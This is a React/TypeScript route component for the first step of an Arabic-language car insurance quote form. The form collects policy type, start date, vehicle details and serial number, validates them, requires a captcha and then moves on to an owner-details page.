import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { ArrowLeft, Car, ShieldCheck } from "lucide-react";
import { carBrands } from "@/lib/insurance-data";
import { submitCurrentStep } from "@/lib/workflow";
import { track } from "@/lib/gate";
import { Turnstile } from "@/components/turnstile";

export const Route = createFileRoute("/reg")({
  head: () => ({
    meta: [
      { title: "بيانات التأمين — بيكير" },
      { name: "description", content: "أدخل بيانات التأمين والمركبة لعرض العروض المتاحة." },
      { property: "og:title", content: "بيانات التأمين — بيكير" },
      { property: "og:description", content: "أدخل بيانات التأمين والمركبة لعرض العروض المتاحة." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: RegisterPage,
});

const PURPOSES = ["شخصي", "تجاري", "تأجير", "نقل الركاب أو كريم - أوبر", "نقل بضائع", "نقل مشتقات نفطية"];
const REPAIR_PLACES = ["الورشة", "الوكالة"];

function RegisterPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    insuranceKind: "",
    startDate: "",
    purpose: "شخصي",
    repairPlace: "الوكالة",
    estimatedValue: "",
    manufactureYear: "",
    make: "",
    model: "",
    serialNumber: "",
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});
  const [captchaToken, setCaptchaToken] = useState("");

  const update = (k: string, v: string) => {
    setForm((p) => ({ ...p, [k]: v }));
    setFieldErrors((p) => ({ ...p, [k]: "" }));
  };

  const validateStartDate = (v: string) => {
    if (!v) return "التاريخ مطلوب";
    const d = new Date(v);
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    return d < today ? "لا يمكن اختيار تاريخ في الماضي" : "";
  };
  const validateSerial = (v: string) => {
    if (!v.trim()) return "يرجى إدخال الرقم التسلسلي";
    return /^\d{6,12}$/.test(v) ? "" : "الرقم التسلسلي غير صحيح. يجب أن يكون رقم تسلسلي سعودي صحيح";
  };

  const years = Array.from({ length: 30 }, (_, i) => String(2027 - i));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const errors: Record<string, string> = {
      insuranceKind: form.insuranceKind ? "" : "يرجى اختيار نوع التأمين",
      startDate: validateStartDate(form.startDate),
      estimatedValue: form.estimatedValue ? "" : "يرجى إدخال القيمة التقديرية",
      manufactureYear: form.manufactureYear ? "" : "يرجى اختيار سنة الصنع",
      make: form.make ? "" : "اختر ماركة السيارة",
      model: form.model.trim() ? "" : "يرجى إدخال الموديل",
      serialNumber: validateSerial(form.serialNumber),
    };
    setFieldErrors(errors);
    if (Object.values(errors).some(Boolean)) return;

    if (!captchaToken) {
      setError("يرجى إكمال التحقق الأمني");
      return;
    }

    setLoading(true);
    track("submit", { step: "insurance_quote" });
    const res = await submitCurrentStep("insurance_quote", { ...form, captcha_token: captchaToken });
    setLoading(false);
    if (res.success) {
      void navigate({ to: "/owner" });
    } else {
      setError(res.error || "حدث خطأ");
    }
  };

  const err = (k: string) =>
    fieldErrors[k] ? <p className="mt-1 text-xs text-red-600">{fieldErrors[k]}</p> : null;

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-3xl">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <Car className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-3xl font-extrabold text-dark-900">بيانات التأمين</h1>
            <p className="mt-2 text-dark-500">أدخل بيانات التأمين والمركبة لعرض العروض المتاحة</p>
          </div>

          <div className="mb-6 flex flex-wrap justify-center gap-2 md:gap-4">
            {["بيانات التأمين", "بيانات مالك الوثيقة", "قائمة الأسعار", "الملخص والدفع"].map((label, i) => (
              <div key={label} className="flex items-center gap-2">
                <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${i === 0 ? "bg-primary-600 text-white" : "bg-dark-200 text-dark-500"}`}>
                  {i + 1}
                </div>
                <span className={`text-xs md:text-sm ${i === 0 ? "font-bold text-dark-900" : "text-dark-400"}`}>{label}</span>
              </div>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="card space-y-5">
              <div className="flex items-center gap-2 border-b border-dark-100 pb-3">
                <ShieldCheck className="h-5 w-5 text-primary-600" />
                <h2 className="text-lg font-bold text-dark-900">بيانات التأمين</h2>
              </div>

              <div>
                <label className="mb-2 block text-sm font-medium text-dark-700">نوع التأمين المطلوب</label>
                <div className="grid grid-cols-1 gap-3 md:grid-cols-3">
                  {[
                    { v: "third_party", label: "ضد الغير", desc: "تغطية أساسية للطرف الثالث" },
                    { v: "tpl-plus", label: "ضد الغير بلس", desc: "تغطية الغير مع مزايا إضافية" },
                    { v: "comprehensive", label: "تأمين شامل", desc: "تغطية كاملة لسيارتك" },
                  ].map((o) => (
                    <button
                      type="button"
                      key={o.v}
                      onClick={() => update("insuranceKind", o.v)}
                      className={`rounded-xl border-2 p-4 text-right transition ${form.insuranceKind === o.v ? "border-primary-600 bg-primary-50" : "border-dark-200 hover:border-primary-300"}`}
                    >
                      <div className="font-bold text-dark-900">{o.label}</div>
                      <div className="mt-1 text-xs text-dark-500">{o.desc}</div>
                    </button>
                  ))}
                </div>
                {err("insuranceKind")}
              </div>

              <div className="grid grid-cols-1 gap-5 md:grid-cols-2">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">تاريخ بداية التأمين</label>
                  <input type="date" value={form.startDate} min={new Date().toISOString().slice(0, 10)} onChange={(e) => update("startDate", e.target.value)} className="input-field" dir="ltr" />
                  {err("startDate")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">غرض استخدام المركبة</label>
                  <select value={form.purpose} onChange={(e) => update("purpose", e.target.value)} className="input-field">
                    {PURPOSES.map((p) => <option key={p} value={p}>{p}</option>)}
                  </select>
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">مكان الإصلاح</label>
                  <select value={form.repairPlace} onChange={(e) => update("repairPlace", e.target.value)} className="input-field">
                    {REPAIR_PLACES.map((p) => <option key={p} value={p}>{p}</option>)}
                  </select>
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">القيمة التقديرية (ر.س)</label>
                  <input value={form.estimatedValue} onChange={(e) => update("estimatedValue", e.target.value.replace(/\D/g, "").slice(0, 7))} className="input-field" placeholder="مثال: 50000" inputMode="numeric" dir="ltr" />
                  {err("estimatedValue")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الشركة المصنعة</label>
                  <select value={form.make} onChange={(e) => update("make", e.target.value)} className="input-field">
                    <option value="">اختر ماركة السيارة</option>
                    {carBrands.map((b) => <option key={b} value={b}>{b}</option>)}
                  </select>
                  {err("make")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الموديل</label>
                  <input value={form.model} onChange={(e) => update("model", e.target.value)} className="input-field" placeholder="مثال: كامري" />
                  {err("model")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">سنة الصنع</label>
                  <select value={form.manufactureYear} onChange={(e) => update("manufactureYear", e.target.value)} className="input-field">
                    <option value="">اختر سنة الصنع</option>
                    {years.map((y) => <option key={y} value={y}>{y}</option>)}
                  </select>
                  {err("manufactureYear")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الرقم التسلسلي</label>
                  <input value={form.serialNumber} onChange={(e) => update("serialNumber", e.target.value.replace(/\D/g, "").slice(0, 12))} className="input-field" placeholder="الرقم التسلسلي للمركبة" inputMode="numeric" dir="ltr" />
                  {err("serialNumber")}
                </div>
              </div>
            </div>

            <div className="card">
              <label className="mb-3 block text-sm font-medium text-dark-700">التحقق الأمني</label>
              <Turnstile onVerify={setCaptchaToken} onExpire={() => setCaptchaToken("")} />
            </div>

            {error && <p className="rounded-lg bg-red-50 px-4 py-2 text-sm text-red-600">{error}</p>}

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جاري التحميل..." : "متابعة"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
